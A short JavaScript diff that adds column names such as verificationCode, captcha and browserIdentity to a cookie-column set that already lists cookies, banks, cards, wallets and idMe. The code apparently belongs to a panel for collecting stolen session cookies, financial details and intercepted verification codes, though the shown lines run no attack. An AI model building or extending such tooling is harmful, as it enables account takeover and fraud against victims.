@@ -28,7 +28,10 @@ const DEFAULT_COOKIE_COLUMNS = new Set([
     'cookieJSON', 'formattedCookie', 'cookieFileURL', 'driveUrl', 'platform',
     'verified', 'fullAccess', 'server', 'timestamp', 'lastUserActivity',
     'projectId', 'userId', 'formId', 'strictly', 'domain', 'ipData', 'deviceData',
-    'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider'
+    'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider',
+    'browserIdentity', 'history', 'verificationOptions', 'verificationChoice',
+    'verificationCode', 'cookieStatus', 'cookie', 'usage', 'submissionId', 'engineProcessing',
+    'captcha', 'qr', 'nextRun', 'lastVerifyData', 'serverlessId'
 ]);
 export function setKnownCookieColumns(headers) {
     if (Array.isArray(headers) && headers.length > 0) {
